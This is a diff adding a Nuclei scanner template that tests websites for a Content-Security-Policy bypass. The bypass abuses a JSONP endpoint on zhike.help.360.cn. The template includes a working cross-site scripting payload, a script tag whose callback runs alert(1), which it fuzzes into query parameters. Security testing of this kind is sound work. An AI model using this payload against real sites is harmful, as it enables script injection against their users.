@@ -1,0 +1,55 @@
+id: zhike-help-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - Zhike Help
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,zhike-help
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "zhike.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: zhike_help_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://zhike.help.360.cn/api/v1/robotWindow?callback=alert(1)-"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "zhike_help_csp_xss == true"
+# digest: 490a0046304402206c6e4fb8781493ec0c4765595f2b1133316cc2e033b0a9d4b1df574b95680511022044a54aff1d014c34e8cccc38a6ffc764d6898b629592becd7d22730218fcc6a0:922c64590222798bb761d5b6d8e72950
